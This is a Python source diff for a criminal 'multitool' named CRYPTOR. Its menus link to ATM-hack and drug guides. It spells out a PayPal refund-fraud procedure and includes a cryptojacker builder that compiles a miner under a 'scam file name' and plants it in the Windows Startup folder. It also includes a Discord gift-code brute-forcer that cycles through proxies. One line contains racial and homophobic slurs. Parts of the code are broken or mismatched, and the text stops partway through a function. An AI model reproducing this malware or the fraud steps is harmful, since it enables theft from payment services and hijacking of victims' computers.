@@ -1,0 +1,1006 @@
+import os
+import random
+import string
+import socket
+import threading
+import time
+import sys
+from cryptography.fernet import Fernet
+import requests
+import subprocess
+import colorama
+from colorama import Fore, Style, init
+from pystyle import Colors, Colorate, Write, Anime
+import tkinter as tk
+from tkinter import filedialog
+
+
+version = "v.1.0 RELEASE"
+
+
+
+init(autoreset=True)
+
+
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def print_cryptor_art():
+    cryptor_art = f"""
+{Fore.MAGENTA}                                          {version}
+                                 ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ ██████╗ 
+                                ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
+                                ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║██████╔╝
+                                ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██╔══██╗
+                                ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝██║  ██║
+                                 ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝
+
+                                                        Made by 0x45
+                                                    0x45_1234 on discord
+                                                 ChingChong0x45 on telegram
+                                                         
+{Style.RESET_ALL}
+"""
+    print(cryptor_art)
+
+
+def print_main_menu():
+    clear()
+    print_cryptor_art()
+    menu_text = f"""{Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                 Welcome to CRYPTOR                    ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [1] Info                           ║
+                                ║                    [2] Methods                        ║
+                                ║                    [3] Tools                          ║
+                                ║                    [4] E-books                        ║ 
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [4] Exit                           ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(menu_text)
+
+
+def print_info():
+    clear()
+    info_text = f""" {Fore.MAGENTA}
+                                ----|||||------------------------------------------------------|||||----
+                                ----|||||  INFO MENU                                           |||||----
+                                ----|||||------------------------------------------------------|||||----
+                                ----|||||                                                      |||||----
+                                ----|||||  I created this because I'm obsessed with making     |||||----
+                                ----|||||  these kinds of tools and I want to be the best      |||||----
+                                ----|||||  on the market for these types of shops. My passion  |||||----
+                                ----|||||  for programming and cybersecurity drives me to      |||||----
+                                ----|||||  continually improve and offer the best products     |||||----
+                                ----|||||  available. CRYPTOR is a culmination of my skills,   |||||----
+                                ----|||||  dedication, and desire to provide top-notch tools   |||||----
+                                ----|||||  that meet the needs of users looking for reliable   |||||----
+                                ----|||||  and efficient solutions. Thank you for choosing     |||||----
+                                ----|||||  CRYPTOR, and I hope it exceeds your expectations.   |||||----
+                                ----|||||                                                      |||||----
+                                ----|||||  Press Enter to return to the main menu.             |||||----
+                                ----|||||------------------------------------------------------|||||----
+"""
+    print(info_text)
+    input()
+
+
+def print_methods_menu():
+    clear()
+    methods_text = f""" {Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                     Methods Menu                      ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                   [1] ATM Hacks                       ║
+                                ║                   [2] Paypal Methods                  ║
+                                ║                   [3] The real world                  ║ 
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                       [4] Exit                        ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(methods_text)
+    choice = input(f"{Fore.MAGENTA}root@cryptormultitool ~> {Style.RESET_ALL}")
+    if choice == '1':
+        print_atm_hacks()
+    elif choice == '2':
+        print_paypal_methods()
+    elif choice == '3':
+        print_real_world()
+    elif choice == '4':
+        return
+
+
+def print_atm_hacks():
+    clear()
+    atm_hacks_text = f""" {Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                   ATM Hacks Menu                      ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [1] ATM Hack 1                     ║
+                                ║                    [2] ATM Hack 2                     ║
+                                ║                    [3] ATM Hack 3                     ║
+                                ║                    [4] Entry ways                     ║
+                                ║                    [5] Pin cracking                   ║ 
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [6] Return                         ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(atm_hacks_text)
+    choice = input(f"{Fore.MAGENTA}root@cryptormultitool ~> {Style.RESET_ALL}")
+    if choice == '1':
+        ATM_Hack1()
+    elif choice == '2':
+        ATM_Hack2()
+    elif choice == '3':
+        ATM_Hack3()
+    elif choice == '4':
+        Entry_ways()
+    elif choice == '5':
+        Pin_cracking()
+    elif choice == '6':
+        print_methods_menu()
+
+
+# Function to Display ATM Hack 1
+def ATM_Hack1():
+    clear()
+    Hack1_text = f""" {Fore.MAGENTA}
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||                                ATM Hack 1                                     |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||        https://www.mediafire.com/file/vjbphwl30mitrlg/ATMHACK1.txt/file       |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the ATM Hacks Menu...{Style.RESET_ALL}
+"""
+    print(Hack1_text)
+    input()
+    print_atm_hacks()
+
+def ATM_Hack2():
+    clear()
+    Hack2_text = f""" {Fore.MAGENTA}
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||                                ATM Hack 2                                     |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||        https://www.mediafire.com/file/is98czjtspe543r/ATMHACK2.txt/file       |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the ATM Hacks Menu...{Style.RESET_ALL}
+"""
+    print(Hack2_text)
+    input()
+    print_atm_hacks()
+
+def ATM_Hack3():
+    clear()
+    Hack3_text = f""" {Fore.MAGENTA}
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||                                ATM Hack 3                                     |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||        https://www.mediafire.com/file/pj2l58v35q0zr2m/ATMHACK3.txt/file       |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the ATM Hacks Menu...{Style.RESET_ALL}
+"""
+    print(Hack3_text)
+    input()
+    print_atm_hacks()
+
+def Entry_ways():
+    clear()
+    EntryWays_text = f""" {Fore.MAGENTA}
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||                                Entry ways                                     |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||      https://www.mediafire.com/file/20bgs2rkphmhvvi/Entry_Ways.txt/file       |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the ATM Hacks Menu...{Style.RESET_ALL}
+"""
+    print(EntryWays_text)
+    input()
+    print_atm_hacks()
+
+def Pin_cracking():
+    clear()
+    PinCracking_text = f""" {Fore.MAGENTA}
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||                                Entry ways                                     |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+            ----|||||    https://www.mediafire.com/file/oxi9j67o9r18vsc/PIN_Cracking.pdf/file       |||||----
+            ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the ATM Hacks Menu...{Style.RESET_ALL}
+"""
+    print(PinCracking_text)
+    input()
+    print_atm_hacks()
+
+# Function to display PayPal Methods
+def print_paypal_methods():
+    clear()
+    paypal_methods_text = f""" {Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                   Paypal Methods                      ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                [1] Paypal refund method               ║
+                                ║                [2] Cashout Balance                    ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║ 
+                                ║                                                       ║
+                                ║                   [3] Methods menu                    ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(paypal_methods_text)
+    choice = input(f"{Fore.MAGENTA}root@cryptormultitool ~> {Style.RESET_ALL}")
+    if choice == '1':
+        print_paypal_friends_family()
+    elif choice == '2':
+        print_cashout_paypal_balance()
+    elif choice == '3':
+        print_methods_menu()
+
+# Function to display PayPal Friends & Family Method
+def print_paypal_friends_family():
+    clear()
+    friends_family_text = f""" {Fore.MAGENTA}
+                                ----|||||------------------------------------------------------|||||----
+                                ----|||||              PAYPAL FRIENDS & FAMILY METHOD          |||||----
+                                ----|||||              REFUND ANY TRANSACTION                  |||||----
+                                ----|||||------------------------------------------------------|||||----
+                1. If you're using a PC, run ccleaner first. Otherwise, simply clearing all of your browser data
+                  will be enough.
+                2. Use a VPN to log in and out of your PayPal account 3-4 times. Note by me: use an IP address with
+                  a high fraud risk.
+                3. Use a VPN to connect to the site you want to refund.
+                4. Make the payment via PayPal (can be both F&F or business).
+                5. Do not log into PayPal until the package arrives (or if it's a digital product, just wait for
+                  some days).
+        6. Now, 1-2 days after your order arrives, open a dispute using your normal IP address (no VPN) and declare it
+        was an unlawful transaction, making up a short story to make it more credible and making them feel
+          horrible about it happening.
+                        7. You should get repaid if everything was done correctly.
+                        Note: Does it work? Sometimes...
+                        To make the method even better, I suggest installing undetectable.io browser and doing
+                        all of the steps without a single
+                        cookie from Google or FB and with WebRTC and JavaScript disabled.
+
+{Fore.MAGENTA}Press Enter to return to the PayPal Methods Menu...{Style.RESET_ALL}
+"""
+    print(friends_family_text)
+    input()
+    print_paypal_methods()
+
+# Function to display Cashout PayPal Balance
+def print_cashout_paypal_balance():
+    clear()
+    cashout_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                           CASHOUT PAYPAL BALANCE                              |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||https://www.mediafire.com/file/yc208ap25u1rbc4/Cashout_paypal_balance.txt/file |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the PayPal Methods Menu...{Style.RESET_ALL}
+"""
+    print(cashout_text)
+    input()
+    print_paypal_methods()
+
+# Function to display The Real World
+def print_real_world():
+    clear()
+    real_world_text = f""" {Fore.MAGENTA}
+                        ----|||||------------------------------------------------------|||||----
+                        ----|||||                THE REAL WORLD                        |||||----
+                        ----|||||------------------------------------------------------|||||----
+                        ----|||||https://mega.nz/folder/snRDRbKD#NMPf8a3Bms_lNJHZRWqFrg|||||----
+                        ----|||||------------------------------------------------------|||||----
+
+{Fore.MAGENTA}Press Enter to return to the Methods Menu...{Style.RESET_ALL}
+"""
+    print(real_world_text)
+    input()
+    print_methods_menu()
+
+# Function to display the tools menu
+def print_tools_menu():
+    clear()
+    tools_text = f""" {Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                      Tools menu                       ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [1] DDoS tool                      ║
+                                ║                    [2] Cryptojacker                   ║
+                                ║                    [3] Giftcard generator             ║
+                                ║                    [4] OTP Bot(BETA)                  ║
+                                ║                    [5] Nitro generator                ║ 
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [6] Return                         ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(tools_text)
+    choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
+    if choice == '1':
+        ddos_tool()
+    elif choice == '2':
+        giftcard_generator()
+    elif choice == '3':
+        run_cryptojacker()
+    elif choice == '4':
+        otp_bot()
+    elif choice == '5':
+        Nitro_gen()
+    elif choice == '6':
+        return
+
+
+def print_ebooks_menu():
+    clear()
+    ebooks_text = f""" {Fore.MAGENTA}
+                                ╔═══════════════════════════════════════════════════════╗
+                                ║                     E-Books menu                      ║
+                                ║          First 5 E-books retrieved from linus         ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [1] Bitcoin                        ║
+                                ║                    [2] Cannabis                       ║
+                                ║                    [3] Heroin                         ║
+                                ║                    [4] Real life bypasses             ║
+                                ║                    [5] WIfi                           ║
+                                ║                                                       ║
+                                ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                ║                                                       ║
+                                ║                    [6] Return                         ║
+                                ╚═══════════════════════════════════════════════════════╝
+"""
+    print(ebooks_text)
+    choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
+    if choice == '1':
+        Bitcoin_menu()
+    elif choice == '2':
+        Cannabis_menu()
+    elif choice == '3':
+        Heroin_menu()
+    elif choice == '4':
+        Bypasses()
+    elif choice == '5':
+        coming_soon()
+    elif choice == '6':
+        return
+
+
+def coming_soon():
+    print("coming in v.1.1")
+
+def Bypasses():
+    clear()
+    Bypasses_text: f"""
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                            Bypasses folder                                    |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/folder/fxf8nmn9q62if/IRL_Bypasses           |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        Press Enter to return to the E-books Menu...
+"""
+    print(Bypasses_text)
+    input()
+    print_ebooks_menu()
+
+def Heroin_menu():
+    clear()
+    Heroin_text: f"""
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                              Heroin folder                                    |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/folder/8zcmnyno9ripa/Cannabis               |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        Press Enter to return to the E-books Menu...
+"""
+    print(Heroin_text)
+    input()
+    print_ebooks_menu()
+
+def Cannabis_menu():
+    clear()
+    cannabis_text: f"""
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                            Cannabis folder                                    |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/folder/8zcmnyno9ripa/Cannabis               |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        Press Enter to return to the Methods Menu...
+"""
+    print(cannabis_text)
+input()
+print_ebooks_menu()
+
+def free_btc():
+        clear()
+        free_btc_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                              Free bitcoin                                     |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||       https://www.mediafire.com/file/36jkrkjk60i4imu/BTC_FREE.pdf/file        |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(free_btc_text)
+        input()
+        Bitcoin_menu()
+def CryptoC():
+        clear()
+        cryptoc_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                              Crypto cash                                      |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||       https://www.mediafire.com/file/wu994ge59vy2usi/CRYPTOC.pdf/file         |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(cryptoc_text)
+def HWT():
+        clear()
+        HWT_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                                  HWT                                          |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/file/xxqgo4q230egku8/hwt.pdf/file           |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(HWT_text)
+        input()
+        Bitcoin_menu()
+def Free_satoshi():
+        clear()
+        Free_satoshi_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                               Free satoshi                                    |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/file/mt8q0iprtnkbffv/SATOSHI.pdf/file       |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(Free_satoshi_text)
+        input()
+        Bitcoin_menu()
+
+def Free_bits():
+        clear()
+        Hundredk_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                             Free 100k bitcoins                                |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/file/h1qmt5gcb0x2ux1/BITS.pdf/file          |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(Hundredk_text)
+        input()
+        Bitcoin_menu()
+def BTC_MM():
+        clear()
+        BTC_MM_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                            Bitcoin moneymaking                                |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||         https://www.mediafire.com/file/h6q8j7g1e369hli/BTC_MM.pdf/file        |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_MM_text)
+        input()
+        Bitcoin_menu()
+def BTC_Pioneer():
+        clear()
+        BTC_Pioneer_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                             Bitcoin Pioneer                                   |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||        https://www.mediafire.com/file/wv7x5uofodeluws/BTCP.pdf/file           |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_Pioneer_text)
+        input()
+        Bitcoin_menu()
+def BTC_SBS():
+        clear()
+        BTC_SBS_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                            Bitcoin step by step                               |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||        https://www.mediafire.com/file/wv7x5uofodeluws/BTCP.pdf/file           |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_SBS_text)
+        input()
+        Bitcoin_menu()
+def BTC_Domination():
+        clear()
+        BTC_Domination_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                             Bitcoin Domination                                |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||      https://www.mediafire.com/file/36jkrkjk60i4imu/BTC_FREE.pdf/file         |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_Domination_text)
+        input()
+        Bitcoin_menu()
+def BTC_Manual():
+        clear()
+        BTC_Manual_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                               Bitcoin Manual                                  |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||      https://www.mediafire.com/file/wbk0j12t2nzr1b5/VIRTUAL_BTC.pdf/file      |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_Manual_text)
+        input()
+        Bitcoin_menu()
+def BTC_Bible():
+        clear()
+        BTC_Bible_text = f""" {Fore.MAGENTA}
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||                               Bitcoin Bible                                   |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+                        ----|||||      https://www.mediafire.com/file/lshanx8v6alcg1b/BTC_BIBLE.pdf/file        |||||----
+                        ----|||||-------------------------------------------------------------------------------|||||----
+"""
+        print(BTC_Bible_text)
+        input()
+        Bitcoin_menu()
+
+
+def Bitcoin_menu():
+    clear()
+    bitcoin_text = f""" {Fore.MAGENTA}
+                                                   ⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
+                                               ⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
+                                            ⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
+                                           ⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
+                                          ⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
+                                         ⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
+                                         ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
+                                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
+                                         ⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
+                                         ⢿⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
+                                         ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
+                                           ⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
+                                          ⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
+                                          ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
+                                         ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+                         ╔═══════════════════════════════════════════════════════════════════════╗
+                         ║                 ┊          Bitcoin menu             ┊                 ║
+                         ║                 ┊                                   ┊                 ║
+                         ║                 ┊━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┊                 ║
+                         ║                 ┊                                   ┊                 ║
+                         ║ 1: Free BTC     ┊    5: Free 100,000 bitcoins       ┊ 9: Dominate BTC ║
+                         ║ 2: Crypto cash  ┊    6: Bitcoin moneymaking         ┊ 10: BTC Manual  ║
+                         ║ 3: HWT          ┊    7: Bitcoin pioneer book        ┊ 11: BTC Bible   ║
+                         ║ 4: Free satoshi ┊    8: Bitcoin step by step        ┊ 12: SOON!       ║
+                         ║                 ┊                                   ┊                 ║ 
+                         ║                 ┊                                   ┊                 ║
+                         ║                 ┊━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┊                 ║
+                         ║                 ┊                                   ┊                 ║
+                         ║                 ┊          [!] Return               ┊                 ║
+                         ╚═══════════════════════════════════════════════════════════════════════╝
+"""
+    print(bitcoin_text)
+    choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
+    if choice == '1':
+        free_btc()
+    elif choice == '2':
+        CryptoC()
+    elif choice == '3':
+        HWT()
+    elif choice == '4':
+        Free_satoshi()
+    elif choice == '5':
+        Free_bits()
+    elif choice == '6':
+        BTC_MM()
+    elif choice == '7':
+        BTC_Pioneer()
+    elif choice == '8':
+        BTC_SBS()
+    elif choice == '9':
+        BTC_Domination()
+    elif choice == '10':
+        BTC_Manual()
+    elif choice == '11':
+        BTC_Bible()
+    elif choice == '!':
+        return
+    else:
+        print("Nigga this dosnt exist u stupid faggot")
+
+
+
+# Function to run the Cryptojacker tool
+def run_cryptojacker():
+    clear()
+    
+    # Cryptojacker ASCII art
+    cryptojacker_art = f"""
+    {Fore.RED}
+     ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗      ██╗ █████╗  ██████╗██║  ██╗███████╗██████╗ 
+    ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗     ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+    ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║     ██║███████║██║     █████╔╝ █████╗  ██████╔╝
+    ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██   ██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+    ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝╚█████╔╝██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
+     ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+
+    Cryptojacker made by 0x45 for the CRYPTOR multitool also made by 0x45
+    """
+    print(cryptojacker_art)
+
+    # Request the scam file name
+    scam_file_name = input(Fore.RED + "Enter the scam file name: ")
+
+    # Request which crypto to mine
+    crypto_choice = input(Fore.RED + "Choose which crypto to mine (eth, btc, ltc): ")
+
+    # Request the crypto address to send the mined crypto to
+    crypto_address = input("Fore.RED + Enter the crypto address to send the mined crypto to: ")
+
+    # Generate the cryptojacker code
+    cryptojacker_code = f"""
+import subprocess
+import time
+
+while True:
+    subprocess.run(["{crypto_choice}_miner", "-a", "scrypt", "-o", "stratum+tcp://pool.{crypto_choice}d.com:3333", "-u", "{crypto_address}", "-p", "x", "--thread-count", "4"])
+    time.sleep(60)
+"""
+
+    # Write the cryptojacker code to a file
+    with open("CRYPTOR.py", "w") as file:
+        file.write(cryptojacker_code)
+
+    # Encrypt the cryptojacker code as an EXE file
+    key = Fernet.generate_key()
+    cipher_suite = Fernet(key)
+    cipher_text = cipher_suite.encrypt(cryptojacker_code.encode())
+
+    with open(scam_file_name, "wb") as file:
+        file.write(cipher_text)
+
+    # Generate the infected EXE file
+    subprocess.run(["pyinstaller", "--onefile", "--windowed", "CRYPTOR.py", "--name", scam_file_name])
+
+    # Move the infected EXE file to the Startup folder
+    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    infected_exe = "CRYPTOR.exe"
+    subprocess.run(["move", infected_exe, startup_folder])
+
+    # Reset the text color
+    print(colorama.Fore.RESET)
+
+    print("The infected executable has been generated and moved to the Startup folder.")
+    input("Press Enter to return to the tools menu.")
+    print_tools_menu()
+
+
+# Function to generate a random alphanumeric string of a given length    
+def generate_random_string(length=18):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def check_code(code, proxies=None):
+    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
+    try:
+        response = requests.get(url, proxies=proxies, timeout=5)
+        return response.status_code
+    except requests.RequestException:
+        return None
+
+# Function to load proxies from a file selected by the user
+def load_proxies():
+    root = tk.Tk()
+    root.withdraw()  # Hide the main window
+    file_path = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text files", "*.txt")])
+    
+    if not file_path:
+        return []
+
+    # Use 'utf-8' encoding to handle a wider range of characters
+    with open(file_path, 'r', encoding='utf-8') as file:
+        proxies = file.read().splitlines()
+    
+    return proxies
+
+def worker(code, proxies):
+    proxy = random.choice(proxies) if proxies else None
+    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
+    status_code = check_code(code, proxies=proxy_dict)
+
+    formatted_code = f"discord.gift/{code}"
+
+    if status_code == 200:
+        Write.Print(f"Valid: {formatted_code}\n", Colors.red_to_blue, interval=0.0000)
+        return True
+    else:
+        Write.Print(f"Invalid: {formatted_code}\n", Colors.red_to_blue, interval=0.0000)
+        return False
+
+# Function to generate and check a specified number of codes
+def generate_and_check_codes(num_strings, proxies):
+    for _ in range(num_strings):
+        code = generate_random_string()
+        if worker(code, proxies):
+            break  # Stop if a valid code is found
+
+# Function to handle the Nitro generator functionality
+def Nitro_gen():
+    clear()
+    print_cryptor_art()
+
+    Write.Print("Note: If the ASCII art doesn't fit in your terminal, consider resizing the terminal manually.\n", Colors.red_to_blue, interval=0.0000)
+    input("Press Enter to continue...")
+
+    use_proxies = input("Do you want to use proxies? (Y/N): ").strip().upper()
+
+    proxies = []
+    if use_proxies == 'Y':
+        proxies = load_proxies()
+        if not proxies:
+            Write.Print("No proxies loaded. Exiting.\n", Colors.red_to_blue, interval=0.0000)
+            return
+
+    Write.Print("1. Nitro Boost\n", Colors.red_to_blue, interval=0.0000)
